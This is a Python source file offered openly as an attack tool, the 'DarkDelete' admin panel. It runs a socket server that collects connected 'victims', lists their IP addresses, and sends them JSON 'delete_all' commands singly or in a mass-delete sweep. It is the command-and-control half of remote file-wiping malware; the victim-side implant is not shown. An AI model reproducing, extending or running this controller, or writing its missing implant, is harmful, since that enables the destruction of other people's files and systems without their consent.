# Mo.dark ready 🕷️☠️
# ADMIN PANEL - Remote File Destruction System

import socket
import threading
import os
import json
from datetime import datetime

class AdminServer:
    def __init__(self, host='0.0.0.0', port=5555):
        self.host = host
        self.port = port
        self.clients = {}
        self.client_counter = 0
        
    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((self.host, self.port))
        server.listen(100)
        print(f"[+] ADMIN PANEL ACTIVE on {self.host}:{self.port}")
        print("[+] Waiting for victims...")
        
        threading.Thread(target=self.accept_clients, args=(server,), daemon=True).start()
        self.control_interface()
        
    def control_interface(self):
        while True:
            self.clear_screen()
            self.show_banner()
            self.show_connected_clients()
            
            print("\n[1] Show connected victims")
            print("[2] Select victim and DELETE ALL FILES")
            print("[3] MASS DELETE - all victims")
            print("[4] Exit")
            
            choice = input("\n[>] Choice: ")
            
            if choice == '1':
                self.show_clients_details()
                input("\n[ENTER] to continue...")
            elif choice == '2':
                self.select_and_delete()
            elif choice == '3':
                self.mass_delete()
            elif choice == '4':
                break
                
    def show_banner(self):
        print("="*60)
        print("    ☠️  DARKDELETE SYSTEM v2.0  ☠️")
        print("    ADMIN CONTROL PANEL - ALPHA_ENGINEER")
        print("="*60)
        
    def show_connected_clients(self):
        print(f"\n[+] Connected victims: {len(self.clients)}")
        for cid, (sock, addr) in self.clients.items():
            print(f"    - Victim [{cid}] : {addr[0]}:{addr[1]}")
            
    def show_clients_details(self):
        print("\n=== VICTIMS DETAILS ===")
        for cid, (sock, addr) in self.clients.items():
            print(f"ID: {cid} | IP: {addr[0]} | Port: {addr[1]}")
            
    def select_and_delete(self):
        if not self.clients:
            print("[!] No victims connected")
            return
            
        target_id = input(f"\n[>] Enter victim ID (0-{len(self.clients)-1}): ")
        try:
            target_id = int(target_id)
            if target_id in self.clients:
                sock, addr = self.clients[target_id]
                self.send_delete_command(sock, target_id)
            else:
                print("[!] ID not found")
        except:
            print("[!] Invalid input")
            
    def send_delete_command(self, sock, client_id):
        command = {"action": "delete_all", "timestamp": str(datetime.now())}
        sock.send(json.dumps(command).encode())
        print(f"[+] DELETE command sent to victim [{client_id}]")
        
        try:
            response = sock.recv(1024).decode()
            print(f"[✓] Confirmation received: {response}")
        except:
            print("[!] Confirmation failed")
        input("\n[ENTER] to continue...")
        
    def mass_delete(self):
        print(f"[!] MASS DELETE - {len(self.clients)} victims will be destroyed")
        confirm = input("[>] Type 'DELETE' to confirm: ")
        if confirm == "DELETE":
            for cid, (sock, addr) in self.clients.items():
                self.send_delete_command(sock, cid)
            print("[+] MASS DELETE command sent to all victims")
        else:
            print("[!] Cancelled")
        input("\n[ENTER] to continue...")
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        
    def accept_clients(self, server):
        while True:
            client_sock, addr = server.accept()
            client_id = self.client_counter
            self.clients[client_id] = (client_sock, addr)
            self.client_counter += 1
            print(f"\n[+] NEW VICTIM CONNECTED! ID: {client_id} | {addr}")
            
            threading.Thread(target=self.handle_client, args=(client_sock, client_id), daemon=True).start()
            
    def handle_client(self, sock, client_id):
        while True:
            try:
                data = sock.recv(1024)
                if not data:
                    break
            except:
                break
        if client_id in self.clients:
            del self.clients[client_id]
            print(f"[-] Victim [{client_id}] disconnected")

if __name__ == "__main__":
    server = AdminServer()
    server.start()